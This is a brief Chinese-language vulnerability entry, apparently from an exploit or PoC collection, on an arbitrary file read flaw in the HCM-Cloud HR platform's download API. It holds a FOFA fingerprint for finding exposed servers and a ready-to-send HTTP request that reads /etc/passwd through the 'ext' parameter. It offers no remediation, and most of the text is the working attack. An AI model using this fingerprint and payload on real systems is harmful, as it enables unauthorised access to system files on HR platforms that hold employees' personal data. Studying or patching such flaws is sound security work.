# HCM-Cloud云端专业人力资源平台download任意文件读取漏洞

HCM-Cloud云端专业人力资源平台download任意文件读取漏洞

## fofa

```javascript
icon_hash="-859381597"
```

## poc

```javascript
GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Connection: close
```

![3ccd7062314c3695db376759d9f74d02](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410241250278.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw